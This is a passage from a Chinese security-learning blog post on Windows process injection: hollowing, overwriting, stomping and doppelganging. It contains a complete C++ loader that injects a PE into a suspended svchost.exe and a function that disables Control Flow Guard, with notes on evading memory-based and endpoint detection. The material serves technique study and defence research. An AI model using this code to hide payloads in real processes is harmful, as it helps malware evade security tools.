alt=\"QQ_1721575525006\"></p>\n<p>后来发现和 编译选项 <code>/Subsystem</code> 有关，右图为svchost.exe，它的Subsystem为GUI APP，而我编译要注入的程序为Console App，所以导致无法正常执行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722873859246.png\" alt=\"QQ_1722873859246\"></p>\n<p>解决方法为：将编译选项更换与svchost.exe相同</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722873994874.png\" alt=\"QQ_1722873994874\"></p>\n<p>同时将注入的PE修改函数为WinMain</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MessageBoxA(0, &quot;Process Hollowing&quot;, &quot;Process Hollowing&quot;, 0);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正常运行！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722874104137.png\" alt=\"QQ_1722874104137\"></p>\n<p>Q：这一行代码作用?：<code>    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</code></p>\n<p>A：恢复PEB基址</p>\n<p>参考：</p>\n<p><a href=\"https://github.com/m0n0ph1/Process-Hollowing\">https://github.com/m0n0ph1/Process-Hollowing</a>   原始x86</p>\n<p><a href=\"https://github.com/comosedice2012/Introduction-to-Process-Hollowing\">https://github.com/comosedice2012/Introduction-to-Process-Hollowing</a>  没有重定位</p>\n<h2 id=\"Process-Hollowing-变体\"><a href=\"#Process-Hollowing-变体\" class=\"headerlink\" title=\"Process Hollowing 变体\"></a>Process Hollowing 变体</h2><p>该变体，是网上文章中最常见的代码。不使用NtUnmapViewOfSection卸载原映射内存，通过要注入PE的OptionalHeader的ImageBase，直接在挂起进程中的该地址开辟新空间、写入PE，这样就省区了修复重定位表的操作。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">对于exe，32位默认基地址(imagebase)是0x400000，64位是0x1400000</span><br><span class=\"line\">对于DLL，32位默认基地址(imagebase)是0x10000000，64位是0x1800000</span><br></pre></td></tr></table></figure>\n\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>CreateFile 读取恶意PE</li>\n<li>GetThreadContext 获取挂起进程上下文与环境信息</li>\n<li>VirtualAllocEx 开辟空间</li>\n<li>WriteProcessMemory 写入PE</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 要确保SourceFile和TargetFile的Subsystem相同以及 位数相同，否则注入失败</span><br><span class=\"line\">const LPCSTR SourceFile &#x3D; &quot;C:\\\\Users\\\\cys\\\\Desktop\\\\box64.exe&quot;;  &#x2F;&#x2F; 待注入PE</span><br><span class=\"line\">const LPCSTR TargetFile &#x3D; &quot;C:\\\\windows\\\\System32\\\\svchost.exe&quot;;  &#x2F;&#x2F; 目标PE</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Process-Hollowing 变体</span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F;创建挂起进程</span><br><span class=\"line\">\tSTARTUPINFOA si &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\tsi.cb &#x3D; sizeof(STARTUPINFOA);</span><br><span class=\"line\">\tPROCESS_INFORMATION pi;</span><br><span class=\"line\"></span><br><span class=\"line\">\tCreateProcessA(</span><br><span class=\"line\">\t\tTargetFile,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tFALSE,</span><br><span class=\"line\">\t\tCREATE_SUSPENDED,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;si,</span><br><span class=\"line\">\t\t&amp;pi</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!pi.hProcess) &#123; cerr &lt;&lt; &quot;[-]Creat process fail&quot;; return 1; &#125;</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]Process PID: &quot; &lt;&lt; pi.dwProcessId &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hfile &#x3D; CreateFile(SourceFile, GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);</span><br><span class=\"line\">\tDWORD dwFileSize &#x3D; GetFileSize(hfile, NULL);</span><br><span class=\"line\">\tPVOID lpBuffer &#x3D; VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class=\"line\">\tDWORD dwReadSize &#x3D; 0;</span><br><span class=\"line\">\tReadFile(hfile, lpBuffer, dwFileSize, &amp;dwReadSize, NULL);</span><br><span class=\"line\">\tCloseHandle(hfile);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 获取挂起进程的线程上下文和映像基址</span><br><span class=\"line\">\tCONTEXT ctx;</span><br><span class=\"line\">\tctx.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">\tPVOID RemoteImageBase;</span><br><span class=\"line\">\tBOOL readpeb &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; 获取被挂起进程基址技巧：通过寄存器https:&#x2F;&#x2F;bbs.kanxue.com&#x2F;thread-253432-1.htm</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\t&#x2F;&#x2F; 从rdx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\t&#x2F;&#x2F; 从ebx寄存器中获取PEB地址，并从PEB中读取挂起的可执行映像的基址</span><br><span class=\"line\">\treadpeb &#x3D; ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;RemoteImageBase, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\tif (!readpeb) &#123;</span><br><span class=\"line\">\t\tDWORD error &#x3D; GetLastError();</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[-]ReadProcessMemory failed with error code: &quot; &lt;&lt; error &lt;&lt; endl;</span><br><span class=\"line\">\t\treturn 1;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tPIMAGE_DOS_HEADER pDos &#x3D; (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class=\"line\">\tPIMAGE_NT_HEADERS pNt &#x3D; (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (LPBYTE)lpBuffer);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F; 对挂起进程开辟空间</span><br><span class=\"line\">\tPVOID pRemoteMem &#x3D; VirtualAllocEx(pi.hProcess, (LPVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[*]VirtualAllocEx: &quot; &lt;&lt; pRemoteMem &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入文件头，包括 DOS&#x2F;NT&#x2F;SECTION headers</span><br><span class=\"line\">\t&#x2F;&#x2F; 从 pi.hProcess 中的 pRemoteMem 地址开始写 lpBuffer 内容的 pNt-&gt;OptionalHeader.SizeOfHeaders 大小字节</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, pRemoteMem, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;写入section节区</span><br><span class=\"line\">\tfor (int i &#x3D; 0; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tauto pSectionHeaders &#x3D; (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));</span><br><span class=\"line\">\t\t&#x2F;&#x2F; section data为空</span><br><span class=\"line\">\t\tif (!pSectionHeaders-&gt;PointerToRawData)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tPVOID pSectionDestination &#x3D; (PVOID)((LPBYTE)pRemoteMem + pSectionHeaders-&gt;VirtualAddress);</span><br><span class=\"line\">\t\tWriteProcessMemory(pi.hProcess, pSectionDestination, (PVOID)((LPBYTE)lpBuffer + pSectionHeaders-&gt;PointerToRawData), pSectionHeaders-&gt;SizeOfRawData, NULL);</span><br><span class=\"line\">\t\tcout &lt;&lt; &quot;[*]Writing &quot; &lt;&lt; pSectionHeaders-&gt;Name &lt;&lt; &quot; section to 0x&quot; &lt;&lt; hex &lt;&lt; pSectionDestination &lt;&lt; endl;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;将rcx寄存器设置为注入软件的入口点</span><br><span class=\"line\">\tGetThreadContext(pi.hThread, &amp;ctx);</span><br><span class=\"line\">#ifdef _WIN64</span><br><span class=\"line\">\tctx.Rcx &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;将eax寄存器设置为注入软件的入口点</span><br><span class=\"line\">#ifdef _X86_</span><br><span class=\"line\">\tctx.Eax &#x3D; (SIZE_T)((LPBYTE)pRemoteMem + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class=\"line\">\tWriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + (sizeof(SIZE_T) * 2)), &amp;pRemoteMem, sizeof(PVOID), NULL);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">\t&#x2F;&#x2F;释放本内存中PE痕迹</span><br><span class=\"line\">\tVirtualFree(lpBuffer, 0, MEM_RELEASE);</span><br><span class=\"line\">\tcout &lt;&lt; &quot;[+]SetThreadContext&quot; &lt;&lt; endl;</span><br><span class=\"line\">\tSetThreadContext(pi.hThread, &amp;ctx); &#x2F;&#x2F; 设置线程上下文</span><br><span class=\"line\">\tResumeThread(pi.hThread); &#x2F;&#x2F; 恢复挂起线程</span><br><span class=\"line\">\tCloseHandle(pi.hThread);</span><br><span class=\"line\">\tCloseHandle(pi.hProcess);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>x64效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722877303330.png\" alt=\"QQ_1722877303330\"></p>\n<p>内存分布：直接在默认0x1400000处开辟Private类型内存，Image映射内存在下面，没截到。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1721571196739.png\" alt=\"QQ_1721571196739\"></p>\n<h2 id=\"通用实现代码\"><a href=\"#通用实现代码\" class=\"headerlink\" title=\"通用实现代码\"></a>通用实现代码</h2><p>该项目实现了四种情况的注入，<a href=\"https://github.com/adamhlt/Process-Hollowing\">https://github.com/adamhlt/Process-Hollowing</a> </p>\n<ul>\n<li>x86 有reloc</li>\n<li>x86 无reloc</li>\n<li>x64 有reloc</li>\n<li>x64 无reloc</li>\n</ul>\n<h1 id=\"Process-Overwriting\"><a href=\"#Process-Overwriting\" class=\"headerlink\" title=\"Process Overwriting*\"></a>Process Overwriting*</h1><p>来讨论一下Process Hollowing的缺点，那就是在内存中显眼的 <strong>MEM_PRIVATE</strong> 内存，为了更好的隐藏特征，提出了该方法。</p>\n<p>此处为  <strong>Process Hollowing 和 Module Overloading</strong> 的综合体，<strong>当PE被加载到内存时初始为Image内存类型，直接将该部分内存空间覆写为注入的PE，这样避免了Private内存的出现</strong></p>\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>VirtualProtectEx 更改Image类型内存属性以便写入</li>\n<li>WriteProcessMemory 将PE覆写</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<hr>\n<p>CFG概述</p>\n<p>在学习Process Overwriting前，先阅读文章：<a href=\"https://www.giantbranch.cn/2019/10/28/CFG%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6%E7%AE%80%E5%8D%95%E5%AE%9E%E8%B7%B5%E4%B8%8E%E4%BB%8B%E7%BB%8D/\">CFG防护机制简单实践与介绍</a>、<a href=\"https://github.com/zzcentury/Exploit-Re/blob/master/History/CFG%E5%8E%9F%E7%90%86%E5%8F%8A%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7.md\">CFG原理及绕过技巧.md</a>、<a href=\"https://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf\">https://sjc1-te-ftp.trendmicro.com/assets/wp/exploring-control-flow-guard-in-windows10.pdf</a> 、<a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/%EF%BC%8C%E6%9D%A5%E5%AD%A6%E4%B9%A0%E7%90%86%E8%A7%A3CFG%E6%9C%BA%E5%88%B6%E5%9C%A8%E8%AF%A5%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E5%BD%B1%E5%93%8D%E3%80%82%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93%E4%B8%BA%EF%BC%9A\">https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/，来学习理解CFG机制在该过程中的影响。简单总结为：</a></p>\n<p>在 <strong>windows10</strong>和 <strong>windows8.1</strong> 中引入了，执行流保护（CFG，Control Flow Guard）通过 <strong>在间接跳转前插入校验代码</strong>，检查目标地址的有效性，进而可以阻止执行流跳转到预期之外的地点，最终及时并有效的进行异常处理，避免引发相关的安全问题。</p>\n<blockquote>\n<p>在编译时启用CFG的模块，编译器会分析出该模块中所有间接函数调用 <strong>可达的目标地址</strong>，并将这一信息保存在Guard CF Function Table中，编译器还会在所有<strong>间接函数调用之前插入一段校验代码</strong>，然后根据其Guard CF Function Table来更新 <strong>CFG Bitmap</strong> 中该模块所对应的位。<strong>调用函数时从CFG Bitmap中取出目标地址所对应的位，根据该位是否设置来判断目标地址是否有效</strong>。若目标地址有效，则该函数返回进而执行间接函数调用；否则，该函数将抛出异常而终止当前进程</p>\n</blockquote>\n<p>对比如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722788802901.png\" alt=\"QQ_1722788802901\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1722788832398.png\" alt=\"QQ_1722788832398\"></p>\n<p>另外：<strong>VirtualAlloc系列API函数开辟的Private可执行的内存空间在CFG位图中都被认定是有效的执行目标</strong>，不受影响。<a href=\"https://bbs.kanxue.com/thread-277740.htm\">利用CFG寻找潜在的ShellCode内存</a></p>\n<hr>\n<p>对于保护机制的检查可以使用 winchecksec 进行查看，可见svchost.exe的CFG为开启状态</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818230805542.png\" alt=\"image-20240818230805542\"></p>\n<p>这里简单测试没有开启CFG的 <code>C:\\\\windows\\\\System32\\\\RtkAudUService64.exe</code> 来进行测试代码，将PE从基址完整覆写</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818231025628.png\" alt=\"image-20240818231025628\"></p>\n<p>成功注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818230526280.png\" alt=\"image-20240818230526280\"></p>\n<p>既然CFG是通过编译器在函数执行前进行检查，我们直接将未开启CFG的恶意可执行文件覆写这部分内存，那么推测接下来的过程不会触发任何CFG检测。但是结果是触发了CFG，导致程序退出。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240818232843561.png\" alt=\"image-20240818232843561\"></p>\n<p>x64dbg调试，三个主要的点 <code>rtluserthreadstart -&gt; BaseThreadInitThunk -&gt; LdrControlFlowGuardEnforced</code>，然后爆出错误</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240819004316994.png\" alt=\"image-20240819004316994\"></p>\n<p>但是具体原因需要仔细研究调试，目前不知道。</p>\n<hr>\n<p>CFG的绕过</p>\n<p>目前可以利用 <strong>SetProcessValidCallTargets</strong> 和 <strong>InitializeProcThreadAttributeList</strong> 和 <strong>SetProcessValidCallTargets底层Nt函数</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">BOOL DisableCfg(PROCESS_INFORMATION pProcessInfo, DWORD victim_size, PVOID victim_base_addr, DWORD cfg_size, PVOID cfg_base) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t_SetProcessValidCallTargets\tpfnSetProcessValidCallTargets &#x3D; NULL;</span><br><span class=\"line\">\tGetFunctionAddressFromDll((PSTR)&quot;kernelbase.dll&quot;,(PSTR)&quot;SetProcessValidCallTargets&quot;,(PVOID*)&amp;pfnSetProcessValidCallTargets);</span><br><span class=\"line\">\tif (pfnSetProcessValidCallTargets &#x3D;&#x3D; NULL) &#123;</span><br><span class=\"line\">\t\treturn FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfor (unsigned long long i &#x3D; 0; (i + 15) &lt; victim_size; i +&#x3D; 16) &#123;</span><br><span class=\"line\">\t\tCFG_CALL_TARGET_INFO tCfgCallTargetInfo &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">\t\ttCfgCallTargetInfo.Flags &#x3D; 0x00000001;</span><br><span class=\"line\">\t\ttCfgCallTargetInfo.Offset &#x3D; (ULONG_PTR)cfg_base - (ULONG_PTR)victim_base_addr + (ULONG_PTR)i;</span><br><span class=\"line\">\t\tpfnSetProcessValidCallTargets(pProcessInfo.hProcess, victim_base_addr, (size_t)victim_size, (ULONG)1, &amp;tCfgCallTargetInfo);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724140519399.png\" alt=\"QQ_1724140519399\"></p>\n<p><strong>过程中一些问题：</strong></p>\n<p>Q：将一个无CFG的恶意PE覆写后，再执行，为什么还是会受到CFG的影响呢？</p>\n<p>A：<strong>可能CFG还对某些API函数进行检查</strong>，但是这其中的过程还需要后续深入学习</p>\n<p>Q：为什么前面两种对svchost.exe的hollowing方法都没有触发CFG呢？</p>\n<p>A：正同上面提到的，<strong>VirtualAlloc开辟的空间都被认为是有效的，不受CFG影响</strong>。</p>\n<p>参考：</p>\n<p><a href=\"https://insinuator.net/2022/09/some-experiments-with-process-hollowing/\">https://insinuator.net/2022/09/some-experiments-with-process-hollowing/</a> </p>\n<p><a href=\"https://github.com/f-block/Process-Hollowing\">https://github.com/f-block/Process-Hollowing</a></p>\n<p><a href=\"https://github.com/hasherezade/process_overwriting\">https://github.com/hasherezade/process_overwriting</a></p>\n<p><a href=\"https://www.4hou.com/posts/8Yzm\">利用直接 SYSCALL 调用禁用 Control Flow Guard，绕过终端防护软件的检测</a></p>\n<h1 id=\"Process-Stomping\"><a href=\"#Process-Stomping\" class=\"headerlink\" title=\"Process Stomping*\"></a>Process Stomping*</h1><p>该变体通过寻找 <strong>自带有RWX权限section的PE</strong>，将shellcode写入该区域，避免使用了 <strong>内存分配</strong> 和 <strong>VirtualprotectEx</strong>，进一步减少敏感函数操作，使得在内存中更加隐秘，此技术基于 <strong>Process Mockingjay</strong> ，原理请见：<a href=\"https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution\">Process Mockingjay</a></p>\n<p>流程如下：</p>\n<ul>\n<li>CreateProcess 创建一个挂起的合法进程</li>\n<li>WriteProcessMemory 将shellcode写到RWX的section</li>\n<li>SetThreadContext 设置上下文</li>\n<li>ResumeThread 恢复挂起进程</li>\n</ul>\n<p>为了搜索符合条件的PE，我创建了一个小工具：<a href=\"https://github.com/yongsheng220/rwx-section\">rwx-section: 寻找具有RWX section的PE</a>，用来搜索具有RWX section的PE</p>\n<p>X64：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1723911520533.png\" alt=\"QQ_1723911520533\"></p>\n<p>X86：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1723913537520.png\" alt=\"QQ_1723913537520\"></p>\n<p>一些结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+]D:\\vsstudio\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll</span><br><span class=\"line\">[+]D:\\Typora\\winmm.dll</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\GlassWire.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\Themida.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\Themida64.exe</span><br><span class=\"line\">[+]C:\\Users\\cys\\Desktop\\ThemidaDemo32_64\\ThemidaSDK\\SecureEngineSDK32.dll</span><br></pre></td></tr></table></figure>\n\n<p>以GlassWire.exe为例，可见其 .themida为RWX权限</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724145365694.png\" alt=\"QQ_1724145365694\"></p>\n<p>写入该区域</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1724145849284.png\" alt=\"QQ_1724145849284\"></p>\n<p>可以使用 <strong>rip/eip</strong> 执行shellcode，既能执行shellcode又能bypass cfg，这样可以让我们绕过所有 CFG 健全性检查，因为线程不会从 CFG 检查函数启动，而是被迫从我们的 shellcode 地址启动。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ctx.Eip &#x3D; (SIZE_T)(LPBYTE)load_base_shifted;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213032966.png\" alt=\"image-20240831213032966\"></p>\n<p>但是要注入的exe需要有完整的dll环境支持。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213145513.png\" alt=\"image-20240831213145513\"></p>\n<p>如果只有单独的exe，没有所需dll，会在线程初始化RtlUserThreadStart报错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213347716.png\" alt=\"image-20240831213347716\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831213407227.png\" alt=\"image-20240831213407227\"></p>\n<p>PS：不太清楚在windows加载器的流程中能否实现只有单个exe也能注入。</p>\n<p>参考：</p>\n<p><a href=\"https://github.com/naksyn/ProcessStomping/\">https://github.com/naksyn/ProcessStomping/</a></p>\n<p><a href=\"https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html\">https://www.naksyn.com/edr%20evasion/2023/11/18/mockingjay-revisited-process-stomping-srdi-beacon.html</a></p>\n<h1 id=\"Process-Doppelganging\"><a href=\"#Process-Doppelganging\" class=\"headerlink\" title=\"Process Doppelganging*\"></a>Process Doppelganging*</h1><p>于2017年BlackHat2017提出的的一种新的注入手法。同Process Overwriting也是解决内存中Private属性</p>\n<p>PPT：<a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\">eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf</a></p>\n<p>视频：<a href=\"https://www.youtube.com/watch?v=XmWOj-cfixs\">https://www.youtube.com/watch?v=XmWOj-cfixs</a></p>\n<p>项目：<a href=\"https://github.com/hasherezade/process_doppelganging\">https://github.com/hasherezade/process_doppelganging</a></p>\n<p>首先提出 Process Hollowing 以及变体手法 的不足</p>\n<ul>\n<li>通过unmap 和 VirtualAllocEx：unmap高危操作，VirtualAllocEx开辟的内存不为Image</li>\n<li>不使用unmap而直接覆写：覆写地址的页属性不是共享的</li>\n<li>unmap后再remap为非Image属性：内存属性不为Image</li>\n<li>unmap后再remap为Image属性：由于Process Hollowing更改了入口点，可以通过 <code>ETHREAD.Win32StartAddress != Image.AddressOfEntryPoint</code> 检测，同时remap创建section需要文件落地。</li>\n</ul>\n<blockquote>\n<p><code>ETHREAD.Win32StartAddress</code> 是 Windows 内核中的一个字段，表示线程在用户模式下的起始地址。它指向线程执行的第一条指令所在的函数（即线程的启动函数）。当一个线程被创建时，它会被分配一个启动函数，该函数的地址会被存储在 <code>Win32StartAddress</code> 中。</p>\n<p><code>Image.AddressOfEntryPoint</code> 指的是一个可执行文件（如 EXE 或 DLL）的入口点地址。这个地址是程序启动时操作系统加载器跳转到的第一个指令位置。在 Windows 可执行文件（PE 格式）中，<code>AddressOfEntryPoint</code> 是可执行文件头中的一个字段，通常表示程序的 <code>main</code> 函数或 <code>WinMain</code> 函数的地址。</p>\n</blockquote>\n<p>Process Doppelganging的基本原理如下：亮点是通过 <strong>利用Windows的 NTFS 事务</strong>，创建一个transaction用于打开一个干净的exe，将恶意代码填充后，利用事务回滚特性恢复到干净exe。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901160455559.png\" alt=\"image-20240901160455559\"></p>\n<p>流程如下：</p>\n<ul>\n<li><p>打开一个正常文件，创建一个transaction(NtCreateTransaction)</p>\n</li>\n<li><p>打开源程序句柄（CreateFileTransacted）</p>\n</li>\n<li><p>向源程序句柄写入shellcode(CreateFile,CreateFileMapping,MapViewOfFile,VirtualAlloc,memcpy,WriteFile)</p>\n</li>\n<li><p>根据此时的文件内容，创建一个section(NtCreateSection)</p>\n</li>\n<li><p>回滚到修改事务之前的状态，抹去一系列更改操作(RollbackTransaction)</p>\n</li>\n<li><p>通过刚刚创建的section，创建进程(NtCreateProcessEx)</p>\n</li>\n<li><p>准备参数到目标进程(跨进程)，我们需要创建新进程的参数，然后将这些参数写入到新进程的PEB中，这是因为新进程需要这些参数来正确地初始化</p>\n</li>\n<li><p>创建初始线程(NtCreateThreadEx)</p>\n</li>\n<li><p>唤醒线程(NtResumeThread)</p>\n</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240903152326145.png\" alt=\"image-20240903152326145\"></p>\n<p>在win10上测试为如下：原因是DF：<a href=\"https://github.com/hasherezade/process_doppelganging/issues/3\">https://github.com/hasherezade/process_doppelganging/issues/3</a></p>\n<blockquote>\n<p><strong>Windows Defender’s minifilter called WdFilter has mitigations against transacted process creation.</strong></p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215747183.png\" alt=\"image-20240901215747183\"></p>\n<p>在win11上测试发现有异常的是，任务管理器中，不显示进程名。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215150595.png\" alt=\"image-20240901215150595\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215032965.png\" alt=\"image-20240901215032965\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240901215323212.png\" alt=\"image-20240901215323212\"></p>\n<h1 id=\"Transacted-Hollowing\"><a href=\"#Transacted-Hollowing\" class=\"headerlink\" title=\"Transacted Hollowing\"></a>Transacted Hollowing</h1><p>借鉴了 Process 